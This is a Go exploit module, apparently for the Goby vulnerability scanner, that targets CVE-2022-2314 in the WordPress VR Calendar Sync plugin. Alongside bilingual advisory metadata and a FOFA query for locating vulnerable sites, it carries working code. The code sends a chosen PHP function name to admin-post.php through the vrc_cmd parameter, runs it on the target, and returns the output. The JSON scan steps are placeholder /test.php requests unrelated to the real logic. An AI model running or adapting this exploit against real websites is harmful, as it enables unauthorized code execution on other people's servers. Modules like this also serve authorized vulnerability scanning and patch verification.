package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Wordpress vr calendar sync plugin admin-post.php vrc_cmd arbitrary function invocation vulnerability (CVE-2022-2314)",
    "Description": "<p>WordPress and WordPress plugin are products of the WordPress Foundation. WordPress is a blog platform developed using PHP language. The platform supports personal blog websites on PHP and MySQL servers. WordPress plugin is an application plug-in.</p><p>WordPress plugin VR Calendar 2.2.2 and earlier contains an arbitrary method call vulnerability. An attacker could use this vulnerability to execute arbitrary PHP functions on the website.</p>",
    "Product": "wordpress-vr-calendar-sync",
    "Homepage": "https://wordpress.org/plugins/vr-calendar-sync/",
    "DisclosureDate": "2022-12-26",
    "Author": "featherstark@outlook.com",
    "FofaQuery": "body=\"/wp-content/plugins\" && body=\"/plugins/vr-calendar-sync\"",
    "GobyQuery": "body=\"/wp-content/plugins\" && body=\"/plugins/vr-calendar-sync\"",
    "Level": "3",
    "Impact": "<p>WordPress plugin VR Calendar 2.2.2 and earlier contains an arbitrary method call vulnerability. An attacker could use this vulnerability to execute arbitrary PHP functions on the website.</p>",
    "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time:<a href=\"https://wordpress.org/plugins/vr-calendar-sync/\">https://wordpress.org/plugins/vr-calendar-sync/</a></p>",
    "References": [
        "https://wordpress.org/plugins/vr-calendar-sync/"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "php_function",
            "type": "input",
            "value": "phpinfo",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Code Execution"
    ],
    "VulType": [
        "Code Execution"
    ],
    "CVEIDs": [
        "CVE-2022-2314"
    ],
    "CNNVD": [
        "CNNVD-202208-3065"
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.6",
    "Translation": {
        "CN": {
            "Name": "wordpress vr-calendar-sync 插件 admin-post.php 文件 vrc_cmd 参数任意方法调用漏洞（CVE-2022-2314）",
            "Product": "wordpress-vr-calendar-sync",
            "Description": "<p>WordPress和WordPress plugin都是WordPress基金会的产品。WordPress是一套使用PHP语言开发的博客平台。该平台支持在PHP和MySQL的服务器上架设个人博客网站。WordPress plugin是一个应用插件。</p><p>WordPress plugin VR Calendar 2.2.2版本及之前版本存在任意方法调用漏洞。攻击者利用该漏洞在网站上执行任意 PHP函数。</p>",
            "Recommendation": "<p>厂商已发布了漏洞修复程序，请及时关注更新：<a href=\"https://wordpress.org/plugins/vr-calendar-sync/\" target=\"_blank\">https://wordpress.org/plugins/vr-calendar-sync/</a><br></p>",
            "Impact": "<p>WordPress plugin VR Calendar 2.2.2版本及之前版本存在任意方法调用漏洞。攻击者利用该漏洞在网站上执行任意 PHP函数。<br></p>",
            "VulType": [
                "代码执行"
            ],
            "Tags": [
                "代码执行"
            ]
        },
        "EN": {
            "Name": "Wordpress vr calendar sync plugin admin-post.php vrc_cmd arbitrary function invocation vulnerability (CVE-2022-2314)",
            "Product": "wordpress-vr-calendar-sync",
            "Description": "<p>WordPress and WordPress plugin are products of the WordPress Foundation. WordPress is a blog platform developed using PHP language. The platform supports personal blog websites on PHP and MySQL servers. WordPress plugin is an application plug-in.</p><p>WordPress plugin VR Calendar 2.2.2 and earlier contains an arbitrary method call vulnerability. An attacker could use this vulnerability to execute arbitrary PHP functions on the website.</p>",
            "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time:<a href=\"https://wordpress.org/plugins/vr-calendar-sync/\" target=\"_blank\">https://wordpress.org/plugins/vr-calendar-sync/</a><br></p>",
            "Impact": "<p>WordPress plugin VR Calendar 2.2.2 and earlier contains an arbitrary method call vulnerability. An attacker could use this vulnerability to execute arbitrary PHP functions on the website.<br></p>",
            "VulType": [
                "Code Execution"
            ],
            "Tags": [
                "Code Execution"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10789"
}`


	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostinfo *httpclient.FixUrl, stepLogs *scanconfig.SingleScanConfig) bool {
			uri := "/wp-admin/admin-post.php?vrc_cmd=phpinfo"
			cfg1 := httpclient.NewGetRequestConfig(uri)
			resp, err := httpclient.DoHttpRequest(hostinfo, cfg1)
			if err != nil {
				return false
			}
			if resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, "PHP Version") {
				return true
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, stepLogs *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			cmd := stepLogs.Params["php_function"].(string)
			uri := "/wp-admin/admin-post.php?vrc_cmd=" + cmd
			cfg1 := httpclient.NewGetRequestConfig(uri)
			resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg1)
			if err != nil {
				expResult.Success = false
				return expResult
			}
			if resp.StatusCode == 200 && len(resp.Utf8Html) >= 2{
				expResult.Success = true
				expResult.Output = "VulUrl:" + expResult.HostInfo.FixedHostInfo + "/wp-admin/admin-post.php?vrc_cmd="+cmd+"\n\n" + resp.Utf8Html
			}
			return expResult
		},
	))
}
